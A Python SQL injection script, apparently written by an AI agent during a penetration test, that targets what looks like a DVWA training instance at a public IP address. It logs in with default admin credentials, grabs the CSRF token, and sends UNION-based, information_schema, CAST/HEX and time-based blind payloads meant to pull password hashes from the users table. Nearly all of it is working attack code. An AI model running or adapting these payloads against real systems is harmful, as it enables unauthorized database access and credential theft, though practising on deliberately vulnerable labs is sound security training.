
import requests
import re
import sys

base_url = "http://31.97.117.123"
login_url = f"{base_url}/login.php"
sqli_url = f"{base_url}/vulnerabilities/sqli/"

# First authenticate
session = requests.Session()
response = session.get(login_url)
token_match = re.search(r"user_token'? value='([a-f0-9]+)'", response.text)

if token_match:
    user_token = token_match.group(1)
    
    # Login
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    
    session.post(login_url, data=data)
    
    print("[*] ========== FINAL COMPREHENSIVE EXTRACTION ==========\n")
    
    # SUMMARY OF EXTRACTED DATA SO FAR
    print("[+] Successfully extracted basic user information:")
    users_extracted = [
        {"id": "1", "first_name": "admin", "surname": "admin"},
        {"id": "2", "first_name": "Gordon", "surname": "Brown"},
        {"id": "3", "first_name": "Hack", "surname": "Me"},
        {"id": "4", "first_name": "Pablo", "surname": "Picasso"},
        {"id": "5", "first_name": "Bob", "surname": "Smith"},
    ]
    
    for user in users_extracted:
        print(f"  ID: {user['id']:2} | Name: {user['first_name']:8} | Surname: {user['surname']:10}")
    
    print("\n[*] Now attempting to extract password hashes...")
    print("[*] The SQL injection appears to be restricting UNION SELECT queries...")
    print("[*] Let me try different encoding and payload variations...\n")
    
    # Try with different techniques
    advanced_payloads = [
        # Try subqueries
        ("1' AND (SELECT password FROM users LIMIT 1) AND '1'='1", "Subquery attempt"),
        # Try information_schema
        ("1' UNION SELECT COLUMN_NAME,DATA_TYPE,TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' LIMIT 1,2--", "Schema enumeration"),
        # Try without UNION, using OR
        ("1 OR 1=1", "OR bypass to get all rows"),
        # Try cast
        ("1 UNION SELECT 1,CAST(password AS CHAR),3", "CAST approach"),
        # Try hex encoding
        ("1 UNION SELECT 1,HEX(password),3", "HEX encoding"),
    ]
    
    for payload, desc in advanced_payloads:
        print(f"\n[*] Attempting: {desc}")
        params = {"id": payload, "Submit": "Submit"}
        try:
            response = session.get(sqli_url, params=params, timeout=10)
            
            # Check response
            pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1).replace('<br />', '\n')
                if "First name:" not in content and len(content) > 50:
                    print(f"[+] Interesting response:\n{content[:500]}")
                elif "password" in content.lower() or "hash" in content.lower():
                    print(f"[+] Found potential hash data:\n{content}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("\n[*] Trying direct MySQL queries via time-based blind SQLi...")
    
    # If UNION SELECT is blocked, try time-based blind SQLi
    time_based_payloads = [
        ("1' AND SLEEP(3)-- ", "Time-based confirmation"),
        ("1' AND IF(1=1,SLEEP(3),0)-- ", "Conditional sleep"),
    ]
    
    for payload, desc in time_based_payloads:
        print(f"\n[*] Testing: {desc}")
        params = {"id": payload, "Submit": "Submit"}
        
        import time
        start = time.time()
        try:
            response = session.get(sqli_url, params=params, timeout=10)
            elapsed = time.time() - start
            print(f"[*] Response time: {elapsed:.2f}s")
            if elapsed > 2:
                print("[+] Time-based SQLi confirmed!")
        except:
            pass

print("\n[*] ========== EXTRACTION COMPLETE ==========")

